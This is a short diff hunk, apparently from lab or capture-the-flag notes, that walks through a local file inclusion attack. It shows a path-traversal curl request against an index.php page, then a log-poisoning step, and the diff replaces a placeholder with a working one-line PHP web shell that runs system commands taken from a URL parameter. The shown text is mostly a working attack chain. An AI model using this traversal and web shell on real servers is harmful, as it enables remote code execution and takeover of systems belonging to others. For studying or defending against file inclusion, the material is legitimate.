@@ -13,7 +13,7 @@ curl http://example.local/meteor/index.php?page=../../../../../../../../../var/l
 
 poison the log by adding a webshell into a field that shows up in the log file
 ```php
-[php web shell]
+<?php echo system($_GET['cmd']); ?>
 ```
 
 utilize the webshell to run remote commands
